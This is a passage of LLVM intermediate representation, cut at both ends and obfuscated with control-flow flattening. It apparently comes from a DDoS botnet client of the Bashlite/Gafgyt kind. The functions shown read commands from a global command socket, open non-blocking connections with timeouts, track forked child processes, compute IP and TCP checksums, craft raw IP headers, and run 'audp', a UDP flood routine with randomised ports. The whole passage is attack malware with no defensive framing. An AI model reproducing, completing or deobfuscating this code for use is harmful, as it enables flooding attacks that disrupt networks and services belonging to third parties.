  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 699671108, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 -760171236, i32 -2078780560
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 809668466, i32 -1990087706
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1722605297, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 2045981556, i32 -835879724
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -2078780560, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 699671108, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 -1722605297, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #9
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1846571482, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1846571482, label %first
    i32 -780735194, label %37
    i32 -2054340986, label %38
    i32 -895037107, label %47
    i32 -687121165, label %52
    i32 1230641549, label %57
    i32 -963066949, label %66
    i32 -1654227969, label %83
    i32 429009541, label %90
    i32 1866719044, label %91
    i32 1540229634, label %92
    i32 -1178280952, label %93
    i32 -746508826, label %94
    i32 -1840002013, label %95
    i32 -1647582167, label %96
    i32 -601845520, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -780735194, i32 -2054340986
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -601845520, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -895037107, i32 -1647582167
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #9
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -687121165, i32 -746508826
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 1230641549, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #6, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 -963066949, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -1654227969, i32 1540229634
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #6
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 429009541, i32 1866719044
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -601845520, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -1178280952, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -601845520, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -1840002013, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -601845520, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -1647582167, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -601845520, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1321294141, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1321294141, label %first
    i32 -185395538, label %9
    i32 842488507, label %11
    i32 -694924943, label %19
    i32 -217273793, label %26
    i32 1995333075, label %36
    i32 1016332086, label %39
    i32 -1110256056, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -185395538, i32 842488507
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1110256056, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #6
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -694924943, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 -217273793, i32 1016332086
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 1995333075, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -694924943, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #6
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -1110256056, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 1147294091, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1147294091, label %6
    i32 -881260799, label %10
    i32 -506975408, label %19
    i32 -1744927755, label %23
    i32 -1338568950, label %30
    i32 -581663343, label %31
    i32 224075405, label %36
    i32 982574045, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 -881260799, i32 -506975408
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 1147294091, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 -1744927755, i32 -1338568950
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 -1338568950, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 -581663343, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 224075405, i32 982574045
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 -581663343, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #9
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #6
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #6
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 385483123, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 385483123, label %first
    i32 272472003, label %32
    i32 -11470922, label %36
    i32 527288324, label %41
    i32 -162043749, label %47
    i32 -1095197008, label %48
    i32 497922241, label %55
    i32 -1215134514, label %60
    i32 -1167060989, label %61
    i32 -785601686, label %69
    i32 -1420548948, label %70
    i32 588263770, label %80
    i32 -1448486755, label %91
    i32 -542825696, label %95
    i32 45845405, label %99
    i32 -523385638, label %104
    i32 -475686309, label %105
    i32 -1317680171, label %106
    i32 1485109911, label %109
    i32 -1000836357, label %110
    i32 -649924634, label %115
    i32 1817605965, label %116
    i32 801431863, label %122
    i32 831791413, label %123
    i32 -1671995341, label %124
    i32 -353541324, label %129
    i32 -1234766635, label %134
    i32 1190612504, label %138
    i32 842094576, label %139
    i32 1052368619, label %145
    i32 -1182422778, label %185
    i32 -1796354619, label %187
    i32 -2087976495, label %192
    i32 1948876163, label %217
    i32 2001772720, label %218
    i32 1489412197, label %231
    i32 -837498977, label %233
    i32 -720954940, label %238
    i32 -1618826983, label %265
    i32 593753592, label %270
    i32 840364366, label %271
    i32 -875881487, label %272
    i32 -812390380, label %275
    i32 -1411466917, label %277
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 272472003, i32 -11470922
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 527288324, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #9
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 527288324, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -162043749, i32 -1095197008
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %12, align 4
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp eq i32 %52, 32
  %54 = select i1 %53, i32 497922241, i32 -1000836357
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -1167060989, i32 -1215134514
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %11, align 4
  %63 = add nsw i32 %62, 1
  %64 = sext i32 %63 to i64
  %65 = call noalias i8* @malloc(i64 %64) #6
  store i8* %65, i8** %16, align 8
  %66 = load i8*, i8** %16, align 8
  %67 = icmp eq i8* %66, null
  %68 = select i1 %67, i32 -785601686, i32 -1420548948
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 -1411466917, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %16, align 8
  %72 = load i32, i32* %11, align 4
  %73 = add nsw i32 %72, 1
  %74 = sext i32 %73 to i64
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 %74, i32 1, i1 false)
  %75 = load i8*, i8** %16, align 8
